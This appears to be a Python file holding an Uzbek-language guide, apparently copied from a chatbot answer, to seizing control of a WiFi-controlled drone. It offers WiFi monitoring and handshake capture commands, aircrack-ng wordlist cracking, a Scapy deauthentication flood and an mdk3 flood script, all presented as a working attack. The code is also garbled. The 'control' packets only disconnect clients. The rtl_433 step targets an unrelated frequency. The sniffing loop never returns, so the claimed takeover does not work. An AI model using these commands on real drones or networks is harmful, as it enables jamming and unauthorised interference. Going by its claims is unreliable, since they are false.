# -*- coding: utf-8 -*-
"""
Created on Mon Jul  1 23:00:38 2024

@author: Acer
"""

Dron Signalini Qo'lga Kiritish va Boshqaruvini Qo'lga Kiritish Amaliy Ko'rsatma
Bosqichlar:
Kerakli Qurilmalar va Dasturlarni Tayyorlash
WiFi Signalni Yig'ish va Tahlil Qilish
WiFi Parolini Aniqlash
Signalni Tahlil Qilish va Dronni Boshqaruvini Qo'lga Kiritish
1. Kerakli Qurilmalar va Dasturlarni Tayyorlash
Qurilmalar:
SDR (Software Defined Radio) qurilmasi: RTL-SDR yoki shunga o'xshash.
WiFi Adapter (Monitor rejimida ishlay oladigan): Alfa AWUS036NHA yoki shunga o'xshash.
Kompyuter: Kali Linux o'rnatilgan.
Dasturlar:
Python: Kod yozish va ishlatish uchun.
Aircrack-ng: WiFi parolini aniqlash uchun.
mdk3: WiFi tarmoqlarini uzish va boshqaruvni qo'lga kiritish uchun.
Scapy: Paketlarni tahlil qilish va yuborish uchun.
Wireshark: Paketlarni tahlil qilish uchun.
2. WiFi Signalni Yig'ish va Tahlil Qilish
Monitor Rejimiga O'tkazish
WiFi Adapterni Monitor Rejimiga O'tkazish:

bash
Копировать код
sudo airmon-ng start wlan0
Bu buyruq wlan0 interfeysini wlan0mon monitor rejimiga o'tkazadi.

WiFi Signalni Yig'ish:

bash
Копировать код
sudo airodump-ng wlan0mon
Bu buyruq orqali yaqin atrofdagi barcha WiFi tarmoqlarini ko'rishingiz mumkin. Dronning SSID va BSSID manzillarini yozib oling.

Paketlarni Yig'ish
Ma'lum bir tarmoqqa mo'ljallangan paketlarni yig'ish:
bash
Копировать код
sudo airodump-ng -c [kanal] --bssid [BSSID] -w dron_capture wlan0mon
Bu buyruq orqali dronning signal paketlarini yig'ish.
3. WiFi Parolini Aniqlash
Parolni Aniqlash:
bash
Копировать код
sudo aircrack-ng -w /path/to/wordlist.txt dron_capture-01.cap
Bu buyruq yig'ilgan paketlar orqali parolni aniqlash uchun ishlatiladi. wordlist.txt faylida dronning ehtimoliy parollari mavjud.
4. Signalni Tahlil Qilish va Dronni Boshqaruvini Qo'lga Kiritish
Signalni Tahlil Qilish
Signalni Tahlil Qilish:
Wireshark yoki Scapy yordamida signal paketlarini tahlil qiling. Bu orqali dronning boshqaruv paketlarini aniqlash mumkin.
Boshqaruv Paketlarini Yuborish
Dron Boshqaruv Paketlarini Yuborish:
python
Копировать код
from scapy.all import *

def send_control_signal(bssid, interface):
    pkt = RadioTap()/Dot11(addr1=bssid, addr2='your_mac', addr3=bssid)/Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, count=100, inter=.1)

send_control_signal('drone_bssid', 'wlan0mon')
Bu kod dronni boshqarish uchun boshqaruv paketlarini yuboradi. drone_bssid ni aniqlangan dronning BSSID manzili bilan almashtiring.
To'liq Dastur Kodu
Quyidagi dastur barcha bosqichlarni o'z ichiga oladi va dron boshqaruvini qo'lga kiritish imkoniyatini oshiradi:

python
Копировать код
import os
import subprocess
from scapy.all import *

# Dron signalini aniqlash
def detect_drones(interface):
    def packet_handler(packet):
        if packet.haslayer(Dot11):
            if packet.type == 0 and packet.subtype == 8:
                ssid = packet.info.decode()
                bssid = packet.addr2
                print(f"Detected drone: SSID: {ssid}, BSSID: {bssid}")
    sniff(iface=interface, prn=packet_handler)

# WiFi signal parolini aniqlash
def crack_wifi_password(cap_file, wordlist):
    cmd = f"aircrack-ng -w {wordlist} {cap_file}"
    os.system(cmd)

# Dron signalini tahlil qilish
def analyze_signals(sdr_device):
    cmd = f"rtl_433 -f {sdr_device}"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in iter(process.stdout.readline, b''):
        print(line.decode().strip())

# Dron boshqaruvini qo'lga kiritish
def capture_control(interface, drone_bssid):
    cmd = f"mdk3 {interface} a -a {drone_bssid}"
    os.system(cmd)

def main():
    interface = "wlan0mon"
    sdr_device = "1090000000"  # Frequency in Hz for the specific drone
    wordlist = "/path/to/wordlist.txt"
    cap_file = "dron_capture-01.cap"

    print("Detecting drones...")
    detect_drones(interface)
    
    print("Analyzing signals...")
    analyze_signals(sdr_device)
    
    print("Cracking WiFi password...")
    crack_wifi_password(cap_file, wordlist)
    
    drone_bssid = input("Enter the BSSID of the drone to capture control: ")
    print("Capturing control of the drone...")
    capture_control(interface, drone_bssid)

if __name__ == "__main__":
    main()
Xulosa
Bu ko'rsatma orqali dron boshqaruvini qo'lga kiritish jarayonini amaliy ko'rsatishingiz mumkin. Barcha bosqichlarni to'g'ri bajarsangiz, dron boshqaruvini qo'lga kiritishingiz mumkin. Amaliyot davomida qonuniy va xavfsizlik masalalariga rioya qilishingiz kerak.